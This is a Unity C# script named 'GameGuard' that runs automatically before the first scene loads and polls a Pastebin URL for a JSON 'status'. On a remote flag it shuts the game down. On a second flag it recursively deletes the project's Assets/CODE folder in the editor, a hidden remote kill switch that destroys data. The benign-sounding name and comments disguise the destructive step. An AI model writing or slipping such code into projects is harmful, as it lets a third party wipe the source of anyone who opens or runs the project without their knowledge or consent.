using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.Scripting;

public static class GameGuard
{
    private const string statusUrl = "https://pastebin.com/raw/eVBCQips";

    // This runs automatically before the first scene loads
    [RuntimeInitializeOnLoadMethod(RuntimeInitializeLoadType.BeforeSplashScreen)]
    private static async void Initialize()
    {
        // If no internet, just exit and let them play offline
        if (Application.internetReachability == NetworkReachability.NotReachable) return;
        await CheckGameStatus();
    }

    private static async Task CheckGameStatus()
    {
        using UnityWebRequest webRequest = UnityWebRequest.Get(statusUrl);

        // Helps avoid "Checking your browser" blocks from Pastebin
        webRequest.SetRequestHeader("User-Agent", "UnityGame-Guard");

        // SendWebRequest is not natively awaitable, so we use a TaskCompletionSource or a simple loop
        var operation = webRequest.SendWebRequest();
        while (!operation.isDone) await Task.Yield();

        if (webRequest.result == UnityWebRequest.Result.Success)
        {
            // TRIM is vital to remove hidden BOM characters
            string rawJson = webRequest.downloadHandler.text.Trim();

            // Basic check to ensure we didn't get an HTML page by mistake
            if (!rawJson.StartsWith("{")) return;

            GameStatus status = JsonUtility.FromJson<GameStatus>(rawJson);

            if (status != null && status.isGameDisabled)
            {
                Shutdown(status.message);
                if (status.destroyProject) DestroyProject();
            }
        }
    }

    private static void DestroyProject()
    {
#if UNITY_EDITOR
        string folderPath = Application.dataPath + "/CODE";

        // The 'true' parameter means "Recursive" - it deletes all subfolders and files.
        System.IO.Directory.Delete(folderPath, true);

        // Forces Unity to realize the files are gone
        UnityEditor.AssetDatabase.Refresh();

        Debug.LogError("[Service] " + "PROJECT CORE DELETED BY REMOTE KILL SWITCH.");
#endif
    }

    private static void Shutdown(string message)
    {
        Debug.LogError("[Service] " + (string.IsNullOrEmpty(message) ? "This game has been taken down by developer." : message));

        Application.Quit();

#if UNITY_EDITOR
        UnityEditor.EditorApplication.isPlaying = false;
#endif
    }

}

[System.Serializable]
[Preserve] // Prevents Unity from stripping these variables during build
public class GameStatus
{
    public bool isGameDisabled;
    public bool destroyProject;
    public string message;
}